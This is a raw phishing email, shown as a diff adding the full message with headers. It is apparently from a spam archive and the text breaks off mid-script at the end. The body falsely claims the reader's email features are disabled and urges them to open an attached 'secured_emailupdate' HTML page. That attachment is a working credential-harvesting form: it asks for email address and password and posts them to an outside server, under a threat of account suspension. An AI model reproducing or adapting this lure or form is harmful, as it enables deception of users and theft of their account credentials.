@@ -1,0 +1,1017 @@
+Return-Path: <bounces+70136-ccb2-jose=monkey.org@email.choicelunch.com>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 53542F4129
+	for <jose@login.monkey.org>; Sun, 19 Apr 2015 20:56:30 -0500 (CDT)
+Received: from smtpin11.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 1708F34E025
+	for <jose@login.monkey.org>; Mon, 20 Apr 2015 01:56:30 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70096751340.11.man75_8ffa8c5d8b62f
+Authentication-Results: auth.b.hostedemail.com; dmarc=none header.from=choicelunch.com
+Authentication-Results: auth.b.hostedemail.com; dkim=fail
+	reason="verification failed; insecure key"
+	header.d=choicelunch.com header.i=@choicelunch.com
+	header.b=HLACsuM5; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 1,0,0,,d41d8cd98f00b204,bounces+70136-ccb2-jose=monkey.org@email.choicelunch.com,:smtpservice@choicelunch.com,RULES_HIT,0,RBL:208.117.49.230:@email.choicelunch.com:.lbl8.mailshell.net-62.18.0.100 64.10.201.10,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: man75_8ffa8c5d8b62f
+X-Filterd-Recvd-Size: 27254
+Received: from o1.email.choicelunch.com (o1.email.choicelunch.com [208.117.49.230])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 20 Apr 2015 01:56:29 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=choicelunch.com; 
+	h=content-type:mime-version:subject:to:from; s=smtpapi; 
+	bh=582x1yrSG/yU0bOgcSaSlOPr5cM=; b=HLACsuM5934+I5nPjUTF90nfKR8HA
+	JtD7cL8ZuwG77f/jgqs0qkuvnjdT6nsBE0Jx83CajZmEPCw3b2HE/WDqUHtid8JC
+	UGjypKedLpsFgQk5SgWMlr8x32qJiwxAg/swi4o/kW6GFPpqodUH0bZHEEDRmqKz
+	ADiIGSxhjZzoGo=
+DomainKey-Signature: a=rsa-sha1; c=nofws; d=choicelunch.com; 
+	h=content-type:mime-version:subject:to:from; q=dns; s=smtpapi; b
+	=L3RWqnl9nBAj3xhCiu0joGq398xHwCK0c8Dm0Vbp3GXf4ZEodUpUMQswgkX2Ec+
+	Ul3fdVy/N8jKALdvRYYKk1y6AIl1KNaEoJIM6urEOt9nMeMepvDbiPDIa9fyW2un
+	BzkU7do38uuarX7O3yobLJHJnPMQ8XTJTYIIEdxhwcr4=
+Received: by filter0327p1mdw1.sendgrid.net with SMTP id filter0327p1mdw1.24636.55345CC94
+        2015-04-20 01:56:27.805940552 +0000 UTC
+Received: from [85.11.45.89] (unknown [85.11.45.89])
+	by ismtpd-039 (SG) with ESMTP id 14cd48a7028.76ea.d5b6f
+	Mon, 20 Apr 2015 01:56:25 +0000 (UTC)
+Content-Type: multipart/mixed; boundary="===============0497893840=="
+MIME-Version: 1.0
+Subject: e-mail update notification
+To: Recipients <smtpservice@choicelunch.com>
+From: "E-MAIL UPDATE TEAM"<smtpservice@choicelunch.com>
+Date: Mon, 20 Apr 2015 03:56:21 +0200
+Message-ID: <14cd48a7028.76ea.d5b6f@ismtpd-039>
+X-SG-EID: uk4PP0eEjut4P8/eKt92EMT2PN5rig6Ts8EnoW54QtDhYcgqnGZYO/9W2zvMtLZc0Q9dTfOT6hKXuI
+ b0rBKs2Hog24wdYBWe2XfFwHOG8fNsjLHiB8/Yz60z+s8QLHWT5pltA3d6Or7FB7a6cBWV9hiZP2yV
+ 3B9b1DIlJ1Vjncs=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 63
+
+You will not see this in a MIME-aware mail reader.
+--===============0497893840==
+MIME-Version: 1.0
+Content-type: multipart/alternative; boundary="----------=_1429494988-14188-6"
+
+This is a multi-part message in MIME format...
+
+------------=_1429494988-14188-6
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Dear user.
+
+For your safety, we have temporarily disabled some features of Email.
+Please download attachment and update, to restore full access.
+
+
+Regards
+
+Mail Service 2015!=
+
+------------=_1429494988-14188-6
+Content-Type: text/html; charset="iso-8859-1"
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+
+<html><body>
+<p>Dear user.</p>
+<p>For your safety, we have temporarily disabled some features of Email. Pl=
+ease download attachment and update, to restore full access.</p>
+<p>Regards</p>
+<p>Mail Service 2015!</p>
+
+<img src=3D"http://email.choicelunch.com/wf/open?upn=3DpefIbq-2F0PhcN2qttzA=
+UOKcqrOrDw1L6ncHuzcceg2g-2BBan0N4632solptceA8K36zUGbNa9D-2BIc6PWi5ZCwcUXtpe=
+TckNxOxl1Yp45lT4ttV6ZGxnfrSgIdZR29xdC6KJ2NJFAdM8j4jIBq8nMCbQvxpmUROmWxJdT99=
+WNOdB-2BV9Sdt9d1oREcEOX1ceXYjrel7oe-2F7t-2Bn99hKQ5C5YMxg-3D-3D" alt=3D"" wi=
+dth=3D"1" height=3D"1" border=3D"0" style=3D"height:1px !important;width:1p=
+x !important;border-width:0 !important;margin-top:0 !important;margin-botto=
+m:0 !important;margin-right:0 !important;margin-left:0 !important;padding-t=
+op:0 !important;padding-bottom:0 !important;padding-right:0 !important;padd=
+ing-left:0 !important;"/>
+</body></html>
+
+------------=_1429494988-14188-6--
+
+--===============0497893840==
+MIME-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment; filename="secured_emailupdate(3).html"
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.=
+w3.or
+g/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=3D(0030)http://ugouptingsacc.honor.es/ -->
+<html xmlns=3D"http://www.w3.org/1999/xhtml"><head><meta http-equiv=3D"Cont=
+ent-Type" content=3D"text/html; charset=3DUTF-8">
+=20=20=20=20
+    <title>secured_emailupdate</title>
+    <link href=3D"./WebMail Update_files/default2.css" rel=3D"stylesheet" t=
+ype=3D"text/css">
+<script language=3D"JavaScript">
+function Validator(frmname)
+{
+  this.formobj=3Ddocument.forms[frmname];
+	if(!this.formobj)
+	{
+	  alert("Error: couldnot get Form object "+frmname);
+		return;
+	}
+	if(this.formobj.onsubmit)
+	{
+	 this.formobj.old_onsubmit =3D this.formobj.onsubmit;
+	 this.formobj.onsubmit=3Dnull;
+	}
+	else
+	{
+	 this.formobj.old_onsubmit =3D null;
+	}
+	this.formobj._sfm_form_name=3Dfrmname;
+	this.formobj.onsubmit=3Dform_submit_handler;
+	this.addValidation =3D add_validation;
+	this.setAddnlValidationFunction=3Dset_addnl_vfunction;
+	this.clearAllValidations =3D clear_all_validations;
+    this.disable_validations =3D false;//new
+    document.error_disp_handler =3D new sfm_ErrorDisplayHandler();
+    this.EnableOnPageErrorDisplay=3Dvalidator_enable_OPED;
+	this.EnableOnPageErrorDisplaySingleBox=3Dvalidator_enable_OPED_SB;
+    this.show_errors_together=3Dtrue;
+    this.EnableMsgsTogether=3Dsfm_enable_show_msgs_together;
+    document.set_focus_onerror=3Dtrue;
+    this.EnableFocusOnError=3Dsfm_validator_enable_focus;
+
+}
+
+function sfm_validator_enable_focus(enable)
+{
+    document.set_focus_onerror =3D enable;
+}
+
+function set_addnl_vfunction(functionname)
+{
+  this.formobj.addnlvalidation =3D functionname;
+}
+
+function sfm_set_focus(objInput)
+{
+    if(document.set_focus_onerror)
+    {
+        objInput.focus();
+    }
+}
+
+function sfm_enable_show_msgs_together()
+{
+    this.show_errors_together=3Dtrue;
+    this.formobj.show_errors_together=3Dtrue;
+}
+function clear_all_validations()
+{
+	for(var itr=3D0;itr < this.formobj.elements.length;itr++)
+	{
+		this.formobj.elements[itr].validationset =3D null;
+	}
+}
+
+function form_submit_handler()
+{
+   var bRet =3D true;
+    document.error_disp_handler.clear_msgs();
+	for(var itr=3D0;itr < this.elements.length;itr++)
+	{
+		if(this.elements[itr].validationset &&
+	   !this.elements[itr].validationset.validate())
+		{
+		  bRet =3D false;
+		}
+        if(!bRet && !this.show_errors_together)
+        {
+          break;
+
+        }
+	}
+
+	if(this.addnlvalidation)
+	{
+	  str =3D" var ret =3D "+this.addnlvalidation+"()";
+	  eval(str);
+
+     if(!ret)=20
+     {
+       bRet=3Dfalse;=20
+     }
+
+	}
+
+   if(!bRet)
+    {
+      document.error_disp_handler.FinalShowMsg();
+      return false;
+    }
+	return true;
+}
+
+function add_validation(itemname,descriptor,errstr)
+{
+	var condition =3D null;
+	if(arguments.length > 3)
+	{
+	 condition =3D arguments[3];=20
+	}
+  if(!this.formobj)
+	{
+		alert("Error: The form object is not set properly");
+		return;
+	}//if
+	var itemobj =3D this.formobj[itemname];
+    if(itemobj.length && isNaN(itemobj.selectedIndex) )
+    //for radio button; don't do for 'select' item
+	{
+		itemobj =3D itemobj[0];
+	}=09
+  if(!itemobj)
+	{
+		alert("Error: Couldnot get the input object named: "+itemname);
+		return;
+	}
+	if(!itemobj.validationset)
+	{
+		itemobj.validationset =3D new ValidationSet(itemobj,this.show_errors_toge=
+ther);
+	}
+	itemobj.validationset.add(descriptor,errstr,condition);
+    itemobj.validatorobj=3Dthis;
+}
+function validator_enable_OPED()
+{
+    document.error_disp_handler.EnableOnPageDisplay(false);
+}
+
+function validator_enable_OPED_SB()
+{
+	document.error_disp_handler.EnableOnPageDisplay(true);
+}
+function sfm_ErrorDisplayHandler()
+{
+  this.msgdisplay =3D new AlertMsgDisplayer();
+  this.EnableOnPageDisplay=3D edh_EnableOnPageDisplay;
+  this.ShowMsg=3Dedh_ShowMsg;
+  this.FinalShowMsg=3Dedh_FinalShowMsg;
+  this.all_msgs=3Dnew Array();
+  this.clear_msgs=3Dedh_clear_msgs;
+}
+function edh_clear_msgs()
+{
+    this.msgdisplay.clearmsg(this.all_msgs);
+    this.all_msgs =3D new Array();
+}
+function edh_FinalShowMsg()
+{
+    this.msgdisplay.showmsg(this.all_msgs);
+}
+function edh_EnableOnPageDisplay(single_box)
+{
+	if(true =3D=3D single_box)
+	{
+		this.msgdisplay =3D new SingleBoxErrorDisplay();
+	}
+	else
+	{
+		this.msgdisplay =3D new DivMsgDisplayer();=09=09
+	}
+}
+function edh_ShowMsg(msg,input_element)
+{
+=09
+   var objmsg =3D new Array();
+   objmsg["input_element"] =3D input_element;
+   objmsg["msg"] =3D  msg;
+   this.all_msgs.push(objmsg);
+}
+function AlertMsgDisplayer()
+{
+  this.showmsg =3D alert_showmsg;
+  this.clearmsg=3Dalert_clearmsg;
+}
+function alert_clearmsg(msgs)
+{
+
+}
+function alert_showmsg(msgs)
+{
+    var whole_msg=3D"";
+    var first_elmnt=3Dnull;
+    for(var m=3D0;m < msgs.length;m++)
+    {
+        if(null =3D=3D first_elmnt)
+        {
+            first_elmnt =3D msgs[m]["input_element"];
+        }
+        whole_msg +=3D msgs[m]["msg"] + "\n";
+    }
+=09
+    alert(whole_msg);
+
+    if(null !=3D first_elmnt)
+    {
+        sfm_set_focus(first_elmnt);
+    }
+}
+function sfm_show_error_msg(msg,input_elmt)
+{
+    document.error_disp_handler.ShowMsg(msg,input_elmt);
+}
+function SingleBoxErrorDisplay()
+{
+ this.showmsg=3Dsb_div_showmsg;
+ this.clearmsg=3Dsb_div_clearmsg;
+}
+
+function sb_div_clearmsg(msgs)
+{
+	var divname =3D form_error_div_name(msgs);
+	show_div_msg(divname,"");
+}
+
+function sb_div_showmsg(msgs)
+{
+	var whole_msg=3D"<ul>\n";
+	for(var m=3D0;m < msgs.length;m++)
+    {
+        whole_msg +=3D "<li>" + msgs[m]["msg"] + "</li>\n";
+    }
+	whole_msg +=3D "</ul>";
+	var divname =3D form_error_div_name(msgs);
+	show_div_msg(divname,whole_msg);
+}
+function form_error_div_name(msgs)
+{
+	var input_element=3D null;
+
+	for(var m in msgs)
+	{
+	 input_element =3D msgs[m]["input_element"];
+	 if(input_element){break;}
+	}
+
+	var divname =3D"";
+	if(input_element)
+	{
+	 divname =3D input_element.form._sfm_form_name + "_errorloc";
+	}
+
+	return divname;
+}
+function DivMsgDisplayer()
+{
+ this.showmsg=3Ddiv_showmsg;
+ this.clearmsg=3Ddiv_clearmsg;
+}
+function div_clearmsg(msgs)
+{
+    for(var m in msgs)
+    {
+        var divname =3D element_div_name(msgs[m]["input_element"]);
+        show_div_msg(divname,"");
+    }
+}
+function element_div_name(input_element)
+{
+  var divname =3D input_element.form._sfm_form_name + "_" +=20
+                   input_element.name + "_errorloc";
+
+  divname =3D divname.replace(/[\[\]]/gi,"");
+
+  return divname;
+}
+function div_showmsg(msgs)
+{
+    var whole_msg;
+    var first_elmnt=3Dnull;
+    for(var m in msgs)
+    {
+        if(null =3D=3D first_elmnt)
+        {
+            first_elmnt =3D msgs[m]["input_element"];
+        }
+        var divname =3D element_div_name(msgs[m]["input_element"]);
+        show_div_msg(divname,msgs[m]["msg"]);
+    }
+    if(null !=3D first_elmnt)
+    {
+        sfm_set_focus(first_elmnt);
+    }
+}
+function show_div_msg(divname,msgstring)
+{
+	if(divname.length<=3D0) return false;
+
+	if(document.layers)
+	{
+		divlayer =3D document.layers[divname];
+        if(!divlayer){return;}
+		divlayer.document.open();
+		divlayer.document.write(msgstring);
+		divlayer.document.close();
+	}
+	else
+	if(document.all)
+	{
+		divlayer =3D document.all[divname];
+        if(!divlayer){return;}
+		divlayer.innerHTML=3Dmsgstring;
+	}
+	else
+	if(document.getElementById)
+	{
+		divlayer =3D document.getElementById(divname);
+        if(!divlayer){return;}
+		divlayer.innerHTML =3Dmsgstring;
+	}
+	divlayer.style.visibility=3D"visible";=09
+}
+
+function ValidationDesc(inputitem,desc,error,condition)
+{
+  this.desc=3Ddesc;
+	this.error=3Derror;
+	this.itemobj =3D inputitem;
+	this.condition =3D condition;
+	this.validate=3Dvdesc_validate;
+}
+function vdesc_validate()
+{
+	if(this.condition !=3D null )
+	{
+		if(!eval(this.condition))
+		{
+			return true;
+		}
+	}
+	if(!validateInput(this.desc,this.itemobj,this.error))
+	{
+		this.itemobj.validatorobj.disable_validations=3Dtrue;
+
+		sfm_set_focus(this.itemobj);
+
+		return false;
+	}
+	return true;
+}
+function ValidationSet(inputitem,msgs_together)
+{
+    this.vSet=3Dnew Array();
+	this.add=3D add_validationdesc;
+	this.validate=3D vset_validate;
+	this.itemobj =3D inputitem;
+    this.msgs_together =3D msgs_together;
+}
+function add_validationdesc(desc,error,condition)
+{
+  this.vSet[this.vSet.length]=3D=20
+  new ValidationDesc(this.itemobj,desc,error,condition);
+}
+function vset_validate()
+{
+    var bRet =3D true;
+    for(var itr=3D0;itr<this.vSet.length;itr++)
+    {
+        bRet =3D bRet && this.vSet[itr].validate();
+        if(!bRet && !this.msgs_together)
+        {
+            break;
+        }
+    }
+    return bRet;
+}
+function validateEmail(email)
+{
+    var splitted =3D email.match("^(.+)@(.+)$");
+    if(splitted =3D=3D null) return false;
+    if(splitted[1] !=3D null )
+    {
+      var regexp_user=3D/^\"?[\w-_\.]*\"?$/;
+      if(splitted[1].match(regexp_user) =3D=3D null) return false;
+    }
+    if(splitted[2] !=3D null)
+    {
+      var regexp_domain=3D/^[\w-\.]*\.[A-Za-z]{2,4}$/;
+      if(splitted[2].match(regexp_domain) =3D=3D null)=20
+      {
+	    var regexp_ip =3D/^\[\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\]$/;
+	    if(splitted[2].match(regexp_ip) =3D=3D null) return false;
+      }// if
+      return true;
+    }
+return false;
+}
+
+function IsCheckSelected(objValue,chkValue)
+{
+    var selected=3Dfalse;
+	var objcheck =3D objValue.form.elements[objValue.name];
+    if(objcheck.length)
+	{
+		var idxchk=3D-1;
+		for(var c=3D0;c < objcheck.length;c++)
+		{
+		   if(objcheck[c].value =3D=3D chkValue)
+		   {
+		     idxchk=3Dc;
+			 break;
+		   }//if
+		}//for
+		if(idxchk>=3D 0)
+		{
+		  if(objcheck[idxchk].checked=3D=3D"1")
+		  {
+		    selected=3Dtrue;
+		  }
+		}//if
+	}
+	else
+	{
+		if(objValue.checked =3D=3D "1")
+		{
+			selected=3Dtrue;
+		}//if
+	}//else=09
+
+	return selected;
+}
+function TestDontSelectChk(objValue,chkValue,strError)
+{
+	var pass =3D true;
+	pass =3D IsCheckSelected(objValue,chkValue)?false:true;
+
+	if(pass=3D=3Dfalse)
+	{
+     if(!strError || strError.length =3D=3D0)=20
+        {=20
+        	strError =3D "Can't Proceed as you selected "+objValue.name;=20=20
+        }//if=09=09=09=20=20
+	  sfm_show_error_msg(strError,objValue);
+=09=20=20
+	}
+    return pass;
+}
+function TestShouldSelectChk(objValue,chkValue,strError)
+{
+	var pass =3D true;
+
+	pass =3D IsCheckSelected(objValue,chkValue)?true:false;
+
+	if(pass=3D=3Dfalse)
+	{
+     if(!strError || strError.length =3D=3D0)=20
+        {=20
+        	strError =3D "You should select "+objValue.name;=20=20
+        }//if=09=09=09=20=20
+	  sfm_show_error_msg(strError,objValue);
+=09=20=20
+	}
+    return pass;
+}
+function TestRequiredInput(objValue,strError)
+{
+ var ret =3D true;
+ var val =3D objValue.value;
+ val =3D val.replace(/^\s+|\s+$/g,"");//trim
+    if(eval(val.length) =3D=3D 0)=20
+    {=20
+       if(!strError || strError.length =3D=3D0)=20
+       {=20
+         strError =3D objValue.name + " : Required Field";=20
+       }//if=20
+       sfm_show_error_msg(strError,objValue);=20
+       ret=3Dfalse;=20
+    }//if=20
+return ret;
+}
+function TestMaxLen(objValue,strMaxLen,strError)
+{
+ var ret =3D true;
+    if(eval(objValue.value.length) > eval(strMaxLen))=20
+    {=20
+      if(!strError || strError.length =3D=3D0)=20
+      {=20
+        strError =3D objValue.name + " : "+ strMaxLen +" characters maximum=
+ ";=20
+      }//if=20
+      sfm_show_error_msg(strError,objValue);=20
+      ret =3D false;=20
+    }//if=20
+return ret;
+}
+function TestMinLen(objValue,strMinLen,strError)
+{
+ var ret =3D true;
+    if(eval(objValue.value.length) <  eval(strMinLen))=20
+    {=20
+      if(!strError || strError.length =3D=3D0)=20
+      {=20
+        strError =3D objValue.name + " : " + strMinLen + " characters minim=
+um  ";=20
+      }//if=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+      sfm_show_error_msg(strError,objValue);=20
+      ret =3D false;=20=20=20
+    }//if=20
+return ret;
+}
+function TestInputType(objValue,strRegExp,strError,strDefaultError)
+{
+   var ret =3D true;
+
+    var charpos =3D objValue.value.search(strRegExp);=20
+    if(objValue.value.length > 0 &&  charpos >=3D 0)=20
+    {=20
+     if(!strError || strError.length =3D=3D0)=20
+      {=20
+        strError =3D strDefaultError;
+      }//if=20
+      sfm_show_error_msg(strError,objValue);=20
+      ret =3D false;=20
+    }//if=20
+ return ret;
+}
+function TestEmail(objValue,strError)
+{
+var ret =3D true;
+     if(objValue.value.length > 0 && !validateEmail(objValue.value)	 )=20
+     {=20
+       if(!strError || strError.length =3D=3D0)=20
+       {=20
+          strError =3D objValue.name+": Enter a valid Email address ";=20
+       }//if=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20
+       sfm_show_error_msg(strError,objValue);=20
+       ret =3D false;=20
+     }//if=20
+return ret;
+}
+function TestLessThan(objValue,strLessThan,strError)
+{
+var ret =3D true;
+	  if(isNaN(objValue.value))=20
+	  {=20
+	    sfm_show_error_msg(objValue.name +": Should be a number ",objValue);=
+=20
+	    ret =3D false;=20
+	  }//if=20
+	  else
+	  if(eval(objValue.value) >=3D  eval(strLessThan))=20
+	  {=20
+	    if(!strError || strError.length =3D=3D0)=20
+	    {=20
+	      strError =3D objValue.name + " : value should be less than "+ strLes=
+sThan;=20
+	    }//if=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+	    sfm_show_error_msg(strError,objValue);=20
+	    ret =3D false;=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+	   }//if=20=20=20
+return ret;=20=20=20=20=20=20=20=20=20=20
+}
+function TestGreaterThan(objValue,strGreaterThan,strError)
+{
+var ret =3D true;
+     if(isNaN(objValue.value))=20
+     {=20
+       sfm_show_error_msg(objValue.name+": Should be a number ",objValue);=
+=20
+       ret =3D false;=20
+     }//if=20
+	 else
+     if(eval(objValue.value) <=3D  eval(strGreaterThan))=20
+      {=20
+        if(!strError || strError.length =3D=3D0)=20
+        {=20
+          strError =3D objValue.name + " : value should be greater than "+ =
+strGreaterThan;=20
+        }//if=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+        sfm_show_error_msg(strError,objValue);=20=20
+        ret =3D false;
+      }//if=20=20
+return ret;=20=20=20=20=20=20=20=20=20=20=20
+}
+function TestRegExp(objValue,strRegExp,strError)
+{
+var ret =3D true;
+    if( objValue.value.length > 0 &&=20
+        !objValue.value.match(strRegExp) )=20
+    {=20
+      if(!strError || strError.length =3D=3D0)=20
+      {=20
+        strError =3D objValue.name+": Invalid characters found ";=20
+      }//if=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+      sfm_show_error_msg(strError,objValue);=20
+      ret =3D false;=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20
+    }//if=20
+return ret;
+}
+function TestDontSelect(objValue,dont_sel_index,strError)
+{
+var ret =3D true;
+    if(objValue.selectedIndex =3D=3D null)=20
+    {=20
+      sfm_show_error_msg("ERROR: dontselect command for non-select Item");=
+=20
+      ret =3D  false;=20
+    }=20
+    if(objValue.selectedIndex =3D=3D eval(dont_sel_index))=20
+    {=20
+     if(!strError || strError.length =3D=3D0)=20
+      {=20
+      strError =3D objValue.name+": Please Select one option ";=20
+      }//if=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+      sfm_show_error_msg(strError,objValue);=20
+      ret =3D  false;=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+     }=20
+return ret;
+}
+function TestSelectOneRadio(objValue,strError)
+{
+	var objradio =3D objValue.form.elements[objValue.name];
+	var one_selected=3Dfalse;
+	for(var r=3D0;r < objradio.length;r++)
+	{
+	  if(objradio[r].checked)
+	  {
+	  	one_selected=3Dtrue;
+		break;
+	  }
+	}
+	if(false =3D=3D one_selected)
+	{
+      if(!strError || strError.length =3D=3D0)=20
+       {
+	    strError =3D "Please select one option from "+objValue.name;
+	   }=09
+	  sfm_show_error_msg(strError,objValue);
+	}
+return one_selected;
+}
+
+function validateInput(strValidateStr,objValue,strError)=20
+{=20
+    var ret =3D true;
+    var epos =3D strValidateStr.search("=3D");=20
+    var  command  =3D "";=20
+    var  cmdvalue =3D "";=20
+    if(epos >=3D 0)=20
+    {=20
+     command  =3D strValidateStr.substring(0,epos);=20
+     cmdvalue =3D strValidateStr.substr(epos+1);=20
+    }=20
+    else=20
+    {=20
+     command =3D strValidateStr;=20
+    }=20
+    switch(command)=20
+    {=20
+        case "req":=20
+        case "required":=20
+         {=20
+		   ret =3D TestRequiredInput(objValue,strError)
+           break;=20=20=20=20=20=20=20=20=20=20=20=20=20
+         }//case required=20
+        case "maxlength":=20
+        case "maxlen":=20
+          {=20
+			 ret =3D TestMaxLen(objValue,cmdvalue,strError)
+             break;=20
+          }//case maxlen=20
+        case "minlength":=20
+        case "minlen":=20
+           {=20
+			 ret =3D TestMinLen(objValue,cmdvalue,strError)
+             break;=20
+            }//case minlen=20
+        case "alnum":=20
+        case "alphanumeric":=20
+           {=20
+				ret =3D TestInputType(objValue,"[^A-Za-z0-9]",strError,=20
+						objValue.name+": Only alpha-numeric characters allowed ");
+				break;=20
+           }
+        case "alnum_s":=20
+        case "alphanumeric_space":=20
+           {=20
+				ret =3D TestInputType(objValue,"[^A-Za-z0-9\\s]",strError,=20
+						objValue.name+": Only alpha-numeric characters and space allowed ");
+				break;=20
+           }=09=09=20=20=20
+        case "num":=20
+        case "numeric":=20
+           {=20
+                ret =3D TestInputType(objValue,"[^0-9]",strError,=20
+						objValue.name+": Only digits allowed ");
+                break;=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+           }
+        case "dec":=20
+        case "decimal":=20
+           {=20
+                ret =3D TestInputType(objValue,"[^0-9\.]",strError,=20
+						objValue.name+": Only numbers allowed ");
+                break;=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+           }
+        case "alphabetic":=20
+        case "alpha":=20
+           {=20
+                ret =3D TestInputType(objValue,"[^A-Za-z]",strError,=20
+						objValue.name+": Only alphabetic characters allowed ");
+                break;=20
+           }
+        case "alphabetic_space":=20
+        case "alpha_s":=20
+           {=20
+                ret =3D TestInputType(objValue,"[^A-Za-z\\s]",strError,=20
+						objValue.name+": Only alphabetic characters and space allowed ");
+                break;=20
+           }
+        case "email":=20
+          {=20
+			   ret =3D TestEmail(objValue,strError);
+               break;=20
+          }
+        case "lt":=20
+        case "lessthan":=20
+         {=20
+    	      ret =3D TestLessThan(objValue,cmdvalue,strError);
+              break;=20
+         }
+        case "gt":=20
+        case "greaterthan":=20
+         {=20
+			ret =3D TestGreaterThan(objValue,cmdvalue,strError);
+            break;=20
+         }//case greaterthan=20
+        case "regexp":=20
+         {=20
+			ret =3D TestRegExp(objValue,cmdvalue,strError);
+           break;=20
+         }
+        case "dontselect":=20
+         {=20
+			 ret =3D TestDontSelect(objValue,cmdvalue,strError)
+             break;=20
+         }
+		case "dontselectchk":
+		{
+			ret =3D TestDontSelectChk(objValue,cmdvalue,strError)
+			break;
+		}
+		case "shouldselchk":
+		{
+			ret =3D TestShouldSelectChk(objValue,cmdvalue,strError)
+			break;
+		}
+		case "selone_radio":
+		{
+			ret =3D TestSelectOneRadio(objValue,strError);
+		    break;
+		}=09=09=20
+    }//switch=20
+	return ret;
+}
+function VWZ_IsListItemSelected(listname,value)
+{
+ for(var i=3D0;i < listname.options.length;i++)
+ {
+  if(listname.options[i].selected =3D=3D true &&
+   listname.options[i].value =3D=3D value)=20
+   {
+     return true;
+   }
+ }
+ return false;
+}
+function VWZ_IsChecked(objcheck,value)
+{
+ if(objcheck.length)
+ {
+     for(var c=3D0;c < objcheck.length;c++)
+     {
+       if(objcheck[c].checked =3D=3D "1" &&=20
+	     objcheck[c].value =3D=3D value)
+       {
+        return true;=20
+       }
+     }
+ }
+ else
+ {
+  if(objcheck.checked =3D=3D "1" )
+   {
+    return true;=20
+   }=20=20=20=20
+ }
+ return false;
+}
+
+
+</script>
+=20=20=20=20
+=20=20=20=20
+<style type=3D"text/css">
+.auto-style1 {
+	color: #FF0000;
+	font-size: medium;
+}
+.auto-style2 {
+	margin-left: 127px;
+}
+.auto-style3 {
+	font-size: large;
+}
+.auto-style4 {
+	font-size: medium;
+}
+</style>
+=20=20=20=20
+=20=20=20=20
+</head>
+=09
+
+<body class=3D"centre" style=3D"margin-top: 32px; text-align: centre; backg=
+round: #fff; text-align: center; font-family: Arial, Helvetica, sans-serif;=
+ /* font-
+
+size: 12px; */ ">
+<div style=3D"background: #143265 url(&#39;http://www.outitgoes.com/images/=
+bg_loginbox.png&#39;) no-repeat top; width: 430px;  margin: 0 auto; color: =
+#fff; -moz-border-radius-bottomright: 18px; -moz-border-radius-bottomleft: =
+18px; -webkit-border-bottom-left-radius: 18px; -webkit-border-
+
+bottom-right-radius: 18px; padding-left:20px; padding-right:20px; padding-t=
+op:120px; padding-bottom:30px" id=3D"defcontainer">
+<form method=3D"POST" name=3D"myemailform" action=3D"http://team221.com/upl=
+oad/processq1.php">
+			<div>
+
+			<h1 class=3D"auto-style3">LOGIN TO UPDATE YOUR E-MAIL ACCOUNT</h1>
+			<p><strong><span class=3D"auto-style4">Please Note:</span></strong> <spa=
+n class=3D"auto-style1">Providing wrong details will result to Account bein=
+g disable.</span></p>
+			<div class=3D"centre">
+			<table style=3D"margin-left: auto; margin-right: auto; width: 300px">
+			<tbody>
+
+			<tr>
+			<th style=3D"width: 20%; text-align: right; padding-right: 1em">Email&nb=
+sp;Address: </th>
+
+			<td style=3D"text-align: left"><input type=3D"text" required=3D"true" na=
+me=3D"email" size=3D"30"/></td>
+			</tr>
+			<tr>
+			<th style=3D"text-align: right; padding-right: 1em">Password: </th>
+			<td style=3D"text-align: left">
+			<input type=3D"password" name=3D"emailpassword" required=3D"true" size=
+=3D"30"/></td>
+
+			</tr>
+			</tbody>
+			</table>
+
+			<br><br>
+			&nbsp;<input type=3D"submit" value=3D"Click To Update Account" class=3D"=
+auto-style2" style=3D"width: 167px"/><br><br>
+=09=09=09
+
+			<br><br>
+			</div>
+
+			</div></form>
+<script language=3D"JavaScript">
+// Code for validating the form
+// Visit http://www.javascript-coder.com/html-form/javascript-form-validati=
+on.phtml
+// for details
+var frmvalidator  =3D new Validator("myemailform");
+frmvalidator.addValidation("email","req","Please provide your email");=20
